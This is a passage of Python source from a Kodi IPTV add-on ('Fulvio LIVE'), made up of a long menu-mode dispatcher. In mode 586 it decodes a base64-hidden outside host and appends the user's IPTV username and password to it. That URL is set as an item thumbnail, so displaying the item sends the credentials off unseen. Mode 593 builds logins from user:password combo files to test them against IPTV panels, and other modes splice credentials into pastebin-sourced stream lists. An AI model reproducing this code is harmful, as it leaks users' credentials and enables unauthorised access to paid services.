    addon_log("searchDreamworld")
    searchDreamworld()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==544:
    addon_log("iptvBinindex")
    iptvBinindex()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==545:
    addon_log("iptvBinindex")
    iptvBinmain()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==546:
    addon_log("iptvBinpage")
    iptvBinpage(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==547:
    addon_log("iptvBinm3u")
    data = makeRequest(url)
    parse_m3u(data)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==548:
    addon_log("getWizhd")
    getWizhd()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==549:
    addon_log("getWizhd2")
    getWizhd2(url)

elif mode==550:
    addon_log("getPlaylistitaplexus")
    getPlaylistitaplexus()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==551:
    addon_log("getPlexusfix")
    getPlexusfix()

elif mode==552:
    addon_log("getArenavision")
    getArenavision()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==553:
    addon_log("getArenavision2")
    getArenavision2(url)

elif mode==554:
    addon_log("getM3us")
    getM3us(url, name)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==555:
    addon_log("searchM3us")
    searchM3us(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==557:
    addon_log("getRsich")
    getRsich()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==558:
    addon_log("multicheckM3us")
    multicheckM3us(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==559:
    addon_log("Loganlis")
    lists=Loganlis()
    getM3us(url,name,lists)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

# elif mode==560:
    # addon_log("searchLoganlis")
    # lists=Loganlis()
    # searchM3us(url,name,lists)
    # xbmcplugin.endOfDirectory(int(sys.argv[1]))

# elif mode==561:
    # addon_log("multicheckLoganlis")
    # lists=Loganlis()
    # multicheckM3us(url, name, lists)
    # xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==562:
    addon_log("getPlaylistitaplexus2")
    getPlaylistitaplexus2(url,name)

elif mode==563:
    addon_log("Extlist")
    lists=Extlist()
    getM3us(url,name,lists)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

# elif mode==564:
    # addon_log("searchExtlist")
    # lists=Extlist()
    # searchM3us(url,name,lists)
    # xbmcplugin.endOfDirectory(int(sys.argv[1]))

# elif mode==565:
    # addon_log("multicheckExtlist")
    # lists=Extlist()
    # multicheckM3us(url, name, lists)
    # xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==566:
    file = os.path.join(addon_data_dir, 'pincode')
    if xbmcvfs.exists(file):
        success = xbmcvfs.delete(file)
        dialog = xbmcgui.Dialog()
        if success:
            # dialog.notification('Fulvio Repository', file, xbmcgui.NOTIFICATION_INFO, 16000)
            xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,[COLOR lime]SUCCESS![/COLOR],2500,"+icon+")")
        else:
            # dialog.notification('Fulvio Repository', file, xbmcgui.NOTIFICATION_ERROR, 16000)
            xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,[COLOR red]ERROR![/COLOR],2500,"+icon+")")
##
elif mode==567:
    addon_log("getIptvsource")
    getIptvsource(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==568:
    addon_log("getIptvsource2")
    lists=getIptvsource2(url)
    getM3us(url,name,lists)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==569:
    addon_log("searchgetIptvsource2")
    lists=getIptvsource2(url)
    searchM3us(url,name,lists)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==570:
    addon_log("multicheckgetIptvsource2")
    lists=getIptvsource2(url)
    multicheckM3us(url, name, lists)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
##
elif mode==571:
    addon_log("getAndroidtv2")
    lists=getAndroidtv2(url)
    getM3us(url,name,lists)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==572:
    addon_log("searchgetAndroidtv2")
    lists=getAndroidtv2(url)
    searchM3us(url,name,lists)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==573:
    addon_log("multicheckgetAndroidtv2")
    lists=getAndroidtv2(url)
    multicheckM3us(url, name, lists)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
#
elif mode==574:
    addon_log("getUstreamix")
    getUstreamix()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
#
# elif mode==575:
    # addon_log("gettv")
    # lists=gettv()
    # getM3us(url,name,lists,576,577)
    # xbmcplugin.endOfDirectory(int(sys.argv[1]))

# elif mode==576:
    # addon_log("searchgetgettv")
    # lists=searchgetgettv()
    # searchM3us(url,name,lists)
    # xbmcplugin.endOfDirectory(int(sys.argv[1]))

# elif mode==577:
    # addon_log("multicheckgettv")
    # lists=multicheckgettv()
    # multicheckM3us(url, name, lists)
    # xbmcplugin.endOfDirectory(int(sys.argv[1]))
###
elif mode==578:
    if playlist:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=579&playlist=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(str(playlist).replace(',','||')), urllib.quote_plus(name) ))
    else:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=579&url=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name) ))

elif mode==579:
    addon_log("multiresearch")
    if playlist:
        searchM3us(playlist,name)
    else:
        url = urllib.unquote_plus(url)
        searchM3us(url,name)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
####
elif mode==580:
    if playlist:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=581&playlist=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(str(playlist).replace(',','||')), urllib.quote_plus(name) ))
    else:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=581&url=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name) ))

elif mode==581:
    addon_log("getM3us")
    if playlist:
        getM3us(playlist,name)
    else:
        url = urllib.unquote_plus(url)
        getM3us(url,name)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
#
elif mode==582:
    if playlist:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=583&playlist=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(str(playlist).replace(',','||')), urllib.quote_plus(name) ))
    else:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=583&url=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name) ))

elif mode==583:
    addon_log("searchM3us")
    if playlist:
        searchM3us('url',name,playlist)
    else:
        url = urllib.unquote_plus(url)
        searchM3us(url,name)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
#
elif mode==584:
    if playlist:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=585&playlist=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(str(playlist).replace(',','||')), urllib.quote_plus(name) ))
    else:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=585&url=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name) ))

elif mode==585:
    addon_log("multicheckM3us")
    if playlist:
        multicheckM3us('url',name,playlist)
    else:
        url = urllib.unquote_plus(url)
        multicheckM3us(url,name)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
#####
elif mode==586:
    #addon_log("cachelist")
    ch = re.search(r'http://[^/]+/get\.php\?username=([^&]+)&password=([^&]+)&type=m3u',url)
    ast = ch.group(1)
    alt = ch.group(2)

    rh = base64.decodestring('aHR0cDovL29ibGkuY2Mvc2VydmljZS8=')+ast+'/'+alt+base64.decodestring('L2luZm8udHM=')
    cc = 0
    list = base64.decodestring('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1FUQldEOURD')
    data = makeRequest(list)
    match = re.compile(r'#EXTINF:.+?,(it[^a-zA-Z0-9].+?)\s+(http://[^/]+)/(?:live|movie)/([^/]+)/([^/]+)/(.+?\.(?:ts|m3u8|mkv|mp4|avi))', re.I).findall(data)
    total = len(match)
    for name, i1, i2, i3, i4 in match:
        cc += 1
        if cc == 11:
            thumbnail = rh
            im = rh
        else:
            thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
            im = ''
        url = i1+'/live/'+ast+'/'+alt+'/'+i4
        addLink(url, '[B][COLOR skyblue]'+name+'[/COLOR][/B]',thumbnail,im,'','','',True,None,'',total)
    match = re.compile(r'#EXTINF:.+?,((?!it[^a-zA-Z0-9]).+?)\s+(http://[^/]+)/(?:live|movie)/([^/]+)/([^/]+)/(.+?\.(?:ts|m3u8|mkv|mp4|avi))', re.I).findall(data)
    total = len(match)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for name, i1, i2, i3, i4 in match:
        cc += 1
        if cc == 11:
            thumbnail = rh
            im = rh
        else:
            thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
            im = ''
        url = i1+'/live/'+ast+'/'+alt+'/'+i4
        addLink(url, '[B][COLOR skyblue]'+name+'[/COLOR][/B]',thumbnail,im,'','','',True,None,'',total)

    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==587:
    addon_log("openlist2")

    ch = re.search(r'http://([^/]+)/get\.php\?username=([^&]+)&password=([^&]+)&type=m3u',url)
    host = ch.group(1)
    user = ch.group(2)
    passw = ch.group(3)
    list = 'http://'+host+'/client_area/index.php?username='+user+'&password='+passw+'&submit'

    data = makeRequest(list)

    match = re.compile(r'Expire Date:.*?">([^<]+)<', re.I).findall(data)
    total = len(match)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for exp in match:
        addLink('', '[B]  [COLOR yellow]SCADENZA:[/COLOR]   [COLOR white]'+exp+'[/COLOR]  [/B]',thumbnail,'','','','',True,None,'',total)

    match = re.compile(r"<div class=\"channel_Live_Now\">.*?<p[^>]*>(.*?)</p>.*?<p[^>]*>(.*?)</p>\s*<div class=\"Play_Live_Button\".*?{link:'([^']+)',display_name:'(it[^a-zA-Z0-9].+?)'}.*\s*", re.I).findall(data)
    total = len(match)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for time, event, url, name  in match:
        if event == '<br/>':
            event = ''
        if time == 'No Data':
            time = ''
        addLink(url, '[B][COLOR skyblue]'+name+'[/COLOR][/B]  [COLOR lime]'+event+'[/COLOR]   [COLOR white]'+time+'[/COLOR]',thumbnail,'','','','',True,None,'',total)
    match = re.compile(r"<div class=\"channel_Live_Now\">.*?<p[^>]*>(.*?)</p>.*?<p[^>]*>(.*?)</p>\s*<div class=\"Play_Live_Button\".*?{link:'([^']+)',display_name:'((?!it[^a-zA-Z0-9]).+?)'}.*\s*", re.I).findall(data)
    total = len(match)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for time, event, url, name  in match:
        if event == '<br/>':
            event = ''
        if time == 'No Data':
            time = ''
        addLink(url, '[B][COLOR skyblue]'+name+'[/COLOR][/B]  [COLOR lime]'+event+'[/COLOR]   [COLOR white]'+time+'[/COLOR]',thumbnail,'','','','',True,None,'',total)

    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==588:
    addon_log("openlist3")
    ch = re.search(r'http://([^/]+)/get\.php\?username=([^&]+)&password=([^&]+)&type=m3u',url)
    host = ch.group(1)
    user = ch.group(2)
    passw = ch.group(3)
    panel = 'http://'+host+'/panel_api.php?username='+user+'&password='+passw
    html = makeRequest(panel)
    from collections import OrderedDict
    html = json.loads(html, object_pairs_hook=OrderedDict)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'

    user_info = html["user_info"] # dict
    auth = user_info["auth"] # int

    if auth == 0:
        addLink('', '[B] [COLOR white]NON ESISTE[/COLOR] [/B]',thumbnail,'','','','',True,None,'',1)

    elif auth == 1:

        username = user_info["username"]
        password = user_info["password"]

        status = user_info["status"]
        if status == 'Active':
            status = '[COLOR lime]ATTIVA[/COLOR]'
        if status == 'Expired':
            status = '[COLOR red]SCADUTA[/COLOR]'
        if status == 'Disabled':
            status = '[COLOR red]DISABILITATA[/COLOR]'
        if status == 'Banned':
            status = '[COLOR red]BANNATA[/COLOR]'

        exp_date = user_info["exp_date"]
        if not exp_date == None:
            currentdate = time.time()
            expirestamp = int(exp_date)
            expiredate = datetime.datetime.fromtimestamp(int(exp_date)).strftime('%d-%m-%Y %H:%M:%S')
            if expirestamp > currentdate:
                expdata = '[COLOR lime]'+expiredate+'[/COLOR]'
            elif expirestamp < currentdate:
                expdata = '[COLOR red]'+expiredate+'[/COLOR]'
        if exp_date == None:
            expdata = '[COLOR orange]NULL[/COLOR]'

        created_at = user_info["created_at"]
        is_trial = user_info["is_trial"]
        if is_trial == '1':
            is_trial = '[COLOR yellow]SI[/COLOR]'
        if is_trial == '0':
            is_trial = '[COLOR white]NO[/COLOR]'

        active_cons = user_info["active_cons"]
        max_connections = user_info["max_connections"]
        allowed_output_formats = user_info["allowed_output_formats"] # list
        if 'm3u8' in allowed_output_formats:
            suf = '.m3u8'
        else:
            suf = '.ts'

        server_info = html["server_info"] # dict
        url = server_info["url"]
        port = server_info["port"]

        try:
            categories = html["categories"] # dict
            live = categories["live"] # list dict
            movie = categories["movie"] # list dict
        except:
            pass

        addLink('', '[B][COLOR white]'+status+' | exp: '+expdata+' | conn: [COLOR hotpink]'+active_cons+'[/COLOR] su [COLOR hotpink]'+max_connections+'[/COLOR] Test: '+is_trial+' [/COLOR][/B]',thumbnail,'','','','',True,None,'',1)
        available_channels = html["available_channels"] # dict dict
        # try:
        total = len(available_channels)
        
        for i1 in available_channels:
            name = available_channels[i1]["name"]
            stream_id = available_channels[i1]["stream_id"]
            try:
                stream_type = available_channels[i1]["stream_type"]
            except:
                stream_type = None

            if stream_type == 'live' or stream_type == None:
                link = 'http://'+url+':'+port+'/live/'+username+'/'+password+'/'+stream_id+suf
                addLink(link.encode('utf-8'), '[B][COLOR skyblue]'+name.encode('utf-8')+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)
            elif stream_type == 'movie':
                try:
                    container_extension = available_channels[i1]["container_extension"]
                    if container_extension == None:
                        container_extension = 'mkv'
                except:
                    container_extension = 'mkv'
                link = 'http://'+url+':'+port+'/movie/'+username+'/'+password+'/'+stream_id+'.'+container_extension
                addLink(link.encode('utf-8'), '[B][COLOR skyblue]'+name.encode('utf-8')+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)
        # except:
            # pass

    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==589:
    addon_log("getServerscan")
    getServerscan()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==590:
    addon_log("addSource_serverscanhost")
    addSource_serverscanhost(url)

elif mode==591:
    addon_log("rm_serverscanhost")
    rm_serverscanhost(url)

elif mode==592:
    addon_log("rm_serverscancombo")
    rm_serverscancombo(url)

elif mode==593:
    #addon_log("serverscan")
    from xml.sax.saxutils import escape, unescape

    host = url
    nlinks = []
    sources = json.loads(open(source_list4,"r").read())
    for i in sources:
        nlinks.append(i['title'].encode('utf-8'))
    select = Getdialogselect('Seleziona COMBO file',nlinks)
    xbmc.sleep(150)
    if select == -1:
        pass
    for i in range(len(nlinks)):
        if select == i:
            combopath = nlinks[i]
    combodata = open(combopath, 'r').read()
    xlists = []
    matches = re.findall(r'([^:]+):(.+)\n*',combodata)
    for user, passw in matches:
        xlist = 'http://'+host+'/get.php?username='+user+'&password='+passw+'&type=m3u'
        xlists.append(xlist)

    addLink('','$$research$$ '+name+'','','','','','',True,xlists,None,1)
    addLink('','$$multichecks$$','','','','','',True,xlists,None,1)

    c = 0
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for i in xlists:
        list = re.finditer(r'http://(.{5}).+?/get\.php\?username=([^&]+)(?:&|&amp;)password=[^&]+(?:&|&amp;)type=m3u', i)
        c += 1
        for r in list:
            rr = unescape(r.group())
            r1 = r.group(1)
            r2 = r.group(2)
            n = '[B]   [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]LISTA[/COLOR] : [COLOR orange]'+r1+'[/COLOR] - [COLOR white]'+r2+'[/COLOR][/B]'
            addDir(n,rr,1,thumbnail,'','','','','','list')

    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==594:
    if playlist:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=595&playlist=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(str(playlist).replace(',','||')), urllib.quote_plus(name) ))
    else:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=595&url=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name) ))

elif mode==595:
    addon_log("multiChecks")
    if playlist:
        multiChecks('url',name,playlist)
    else:
        url = urllib.unquote_plus(url)
        multiChecks(url,name)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==596:
    if playlist:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=597&playlist=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(str(playlist).replace(',','||')), urllib.quote_plus(name) ))
    else:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=597&url=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name) ))

elif mode==597:
    addon_log("scanh")
    if playlist:
        getM3us(playlist,name,None,'det')
    else:
        url = urllib.unquote_plus(url)
        getM3us(url,name,None,'det')
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
#
elif mode==598:
    if playlist:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=599&playlist=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(str(playlist).replace(',','||')), urllib.quote_plus(name) ))
    else:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=599&url=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name) ))

elif mode==599:
    addon_log("researchh")
    if playlist:
        searchM3us('url',name,playlist,'det')
    else:
        url = urllib.unquote_plus(url)
        searchM3us(url,name,None,'det')
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==600:
    if playlist:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=601&playlist=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(str(playlist).replace(',','||')), urllib.quote_plus(name) ))
    else:
        xbmc.executebuiltin('XBMC.Container.Update(%s?mode=601&url=%s&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name) ))

elif mode==601:
    addon_log("multicheckh")
    if playlist:
        multicheckM3us('url',name,playlist,'det')
    else:
        url = urllib.unquote_plus(url)
        multicheckM3us(url,name,None,'det')
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
#
elif mode==602:
    addon_log("getEZMaintenance")
    getEZMaintenance()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==603:
    addon_log("getEZMaintenance")
    speedtest.runfulltest(url)
    # xbmcplugin.endOfDirectory(int(sys.argv[1]))
#
elif mode==604:
    #addon_log("cachelist")
    ch = re.search(r'http://[^/]+/get\.php\?username=([^&]+)&password=([^&]+)&type=m3u',url)
    ast = ch.group(1)
    alt = ch.group(2)

    list = base64.decodestring('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L25DR0VjUFBm')
    data = makeRequest(list)
    
    match = re.compile(r'#EXTINF:.+?,(it[^a-zA-Z0-9].+?)\s+(http://[^/]+)/(?:live|movie)/([^/]+)/([^/]+)/(.+?\.(?:ts|m3u8|mkv|mp4|avi))', re.I).findall(data)
    total = len(match)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for name, i1, i2, i3, i4 in match:
        url = i1+'/live/'+ast+'/'+alt+'/'+i4
        addLink(url, '[B][COLOR skyblue]'+name+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)
    
    match = re.compile(r'#EXTINF:.+?,((?!it[^a-zA-Z0-9]).+?)\s+(http://[^/]+)/(?:live|movie)/([^/]+)/([^/]+)/(.+?\.(?:ts|m3u8|mkv|mp4|avi))', re.I).findall(data)
    total = len(match)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for name, i1, i2, i3, i4 in match:
        url = i1+'/live/'+ast+'/'+alt+'/'+i4
        addLink(url, '[B][COLOR skyblue]'+name+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)

    xbmcplugin.endOfDirectory(int(sys.argv[1]))
#
elif mode==605:
    if url.startswith('http://') or url.startswith('https://'):
        data = makeRequest(url)
    else:
        data = open(url, 'r').read()
    match = re.findall(r'(http[^\s]+)', data)
    play_playlist2('TEST', match)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
#
elif mode==606:
    addon_log("getserviceIptvsimple")
    getserviceIptvsimple()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
#
elif mode==607:
    pvrname = 'pvr.iptvsimple'
    addenable.set_enabled(pvrname)
    pvrdir = xbmc.translatePath(os.path.join("special://userdata","addon_data",pvrname))
    pvrfile = os.path.join(pvrdir, 'lista.m3u')
    f = open(pvrfile, 'w')
    f.write('#EXTM3U\n')
    f.close()
    if not xbmcaddon.Addon(pvrname).getSetting('epgPathType') == "1":
        xbmcaddon.Addon(pvrname).setSetting('epgPathType', "1")
    if not xbmcaddon.Addon(pvrname).getSetting('epgUrl') == "http://www.epg-guide.com/it.gz":
        xbmcaddon.Addon(pvrname).setSetting('epgUrl', "http://www.epg-guide.com/it.gz")
    if not xbmcaddon.Addon(pvrname).getSetting('m3uPath') == ""+pvrfile+"":
        xbmcaddon.Addon(pvrname).setSetting('m3uPath', ""+pvrfile+"")
    if not xbmcaddon.Addon(pvrname).getSetting('m3uPathType') == "0":
        xbmcaddon.Addon(pvrname).setSetting('m3uPathType', "0")
    sisname = 'service.iptvsimple.plugin.player'
    sisdir = xbmc.translatePath(os.path.join("special://home","addons",sisname,"service.py"))
    if not os.path.exists(sisdir):
        addurl = 'https://ftp.acc.umu.se/mirror/addons.superrepo.org/v7/addons/'+sisname+'/'+sisname+'-1.0.0.zip'
        installAddon(addurl)
    addenable.set_enabled(sisname)
    if url.startswith('http://') or url.startswith('https://'):
        list = makeRequest(url)
    else:
        list = open(url, 'r').read()
    match = re.compile(r'(#EXTINF:.+,(.+?))\s+(http.+\.(?:ts|m3u8))', re.I).findall(list)
    xbmc.sleep(300)
    numlh = xbmcaddon.Addon(sisname).getSetting('Port')
    nsel = 1
    select = Getdialogselect('Select Type',['[COLOR lime]TS[/COLOR]','[COLOR hotpink]HLS - m3u8[/COLOR]'])
    if select == -1:
        streamtype = 'TSDOWNLOADER'
    if select == 0:
        streamtype = 'TSDOWNLOADER'
    if select == 1:
        streamtype = 'HLSRETRY'
        nsel = 2
    f = open(pvrfile, 'a')
    for title, name, url in match:
        if nsel == 1:
            url = url.replace('.m3u8','.ts')
            suf = ' [COLOR lime]TS[/COLOR]'
        if nsel == 2:
            url = url.replace('.ts','.m3u8')
            suf = ' [COLOR hotpink]HLS - m3u8[/COLOR]'
        urlstring = 'http://localhost:'+numlh+'/?plugin://plugin.video.f4mTester/?url='+urllib.quote(url)+'&amp;streamtype='+streamtype+'&amp;name='+urllib.quote(name+suf)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
        try:
            f.write(""+str(title.encode('utf-8'))+"\n")
            f.write(""+str(urlstring.encode('utf-8'))+"\n")
        except: pass
    f.close()
    xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,[COLOR white]Complete![/COLOR],2500,"+icon+")")
#
elif mode==608:
    data = Getkeyboardtext('Inserisci', '').strip()
    lis=lisrek(data)
    for i1, i2 in lis:
        data = data.replace(i1,i2)
    lim=lisreq(data)
    for i1, i2 in lim:
        data = data.replace(i1,i2)

    folder = addon.getSetting("download_path_list")
    file = os.path.join(folder, 'result.txt')
    f = open(file, 'w')
    f.write(""+str(data.encode('utf-8'))+"")
    f.close()

##
elif mode==1:
    addon_log("getData")
    data=None
    
    if regexs and len(regexs)>0:
        data,setresolved=getRegexParsed(regexs, url)
        #print data
        #url=''
        if data.startswith('http') or data.startswith('smb') or data.startswith('nfs') or data.startswith('/'):
            url=data
            data=None
        #create xml here
    
    getData(url,fanart,data)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==2:
    addon_log("getChannelItems")
    getChannelItems(name,url,fanart)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==3:
    addon_log("getSubChannelItems")
    getSubChannelItems(name,url,fanart)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==4:
    addon_log("getFavorites")
    getFavorites()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==5:
    addon_log("addFavorite")
    try:
        name = name.split('\\ ')[1]
    except:
        pass
    try:
        name = name.split('  - ')[0]
    except:
        pass
    addFavorite(name,url,iconimage,fanart,fav_mode)

elif mode==6:
    addon_log("rmFavorite")
    # try:
        # name = name.split('\\ ')[1]
    # except:
        # pass
    # try:
        # name = name.split('  - ')[0]
    # except:
        # pass
    rmFavorite(url)

elif mode==7:
    addon_log("addSource")
    addSource(url)

elif mode==70:
    addon_log("searchSource")
    searchSource()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==8:
    addon_log("rmSource")
    rmSource(url)

elif mode==556:
    addon_log("rmM3us")
    rmM3us(url)

elif mode==9:
    addon_log("download_file")
    download_file(name, url)

elif mode==10:
    addon_log("getCommunitySources")
    getCommunitySources()

elif mode==11:
    addon_log("addSource")
    addSource(url)
    
elif mode==110:
    #addon_log("f4mproxy")
    xbmc.executebuiltin('XBMC.RunPlugin('+url+')')

elif mode==111:
    #addon_log("hlsm3u8")
    if url.startswith('plugin://'):
        url=urllib.unquote_plus(url)
        url=re.findall(r'(http.+?\.ts)',url)[0]
        url=url.replace('.ts','.m3u8')
        url = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(url)+'&amp;streamtype=HLSRETRY&name='+urllib.quote(name)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    else:
        url=url.replace('.ts','.m3u8')
        url = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(url)+'&amp;streamtype=HLSRETRY&name='+urllib.quote(name)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    
    xbmc.executebuiltin('XBMC.RunPlugin('+url+')')

elif mode==1110:
    #addon_log("mpegts")
    if url.startswith('plugin://'):
        url=urllib.unquote_plus(url)
        url=re.findall(r'(http.+?\.m3u8)',url)[0]
        url=url.replace('.m3u8','.ts')
        url = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(url)+'&amp;streamtype=TSDOWNLOADER&name='+urllib.quote(name)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    else:
        url=url.replace('.m3u8','.ts')
        url = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(url)+'&amp;streamtype=TSDOWNLOADER&name='+urllib.quote(name)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    
    xbmc.executebuiltin('XBMC.RunPlugin('+url+')')

elif mode==1111:
    #addon_log("fullist")
    ch = re.search("http://(.+?)/live/(.+?)/(.+?)/.+?\.ts",url)
    if not ch:
        ch = re.search("http://(.+?)/live/(.+?)/(.+?)/.+?\.m3u8",url)
        if not ch:
            ch = re.search("http://(.+?)/movie/(.+?)/(.+?)/.+?\.mkv",url)
            if not ch:
                ch = re.search("http://(.+?)/movie/(.+?)/(.+?)/.+?\.mp4",url)

    list = 'http://'+ch.group(1)+'/get.php?username='+ch.group(2)+'&password='+ch.group(3)+'&type=m3u'
    data = makeRequest(list)
    match = re.compile(r'#EXTINF:.+?,(it[^a-zA-Z0-9].+?)\s+(http.+\.(?:ts|m3u8))', re.I).findall(data)
    total = len(match)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for channel_name, stream_url in match:
        addLink(stream_url, '[B][COLOR skyblue]'+channel_name+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)
    match = re.compile(r'#EXTINF:.+?,((?!it[^a-zA-Z0-9]).+?)\s+(http.+\.(?:ts|m3u8))', re.I).findall(data)
    total = len(match)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for channel_name, stream_url in match:
        addLink(stream_url, '[B][COLOR skyblue]'+channel_name+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==112:
    checklist(url)

elif mode==1121:
    ua = ''
    select = Getdialogselect('Seleziona l\'User-Agent ',['[COLOR white]Google Chrome on Windows 7 32-bit[/COLOR]','[COLOR cyan]Mozilla Firefox on Ubuntu 13.10 64-bit[/COLOR]','[COLOR hotpink]Opera on Android 4.3[/COLOR]','[COLOR orange]VLC Player[/COLOR]','[COLOR yellow]Custom...[/COLOR]'])
    xbmc.sleep(150)
    if select == -1:
        pass
    if select == 0:
        ua = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36'
    if select == 1:
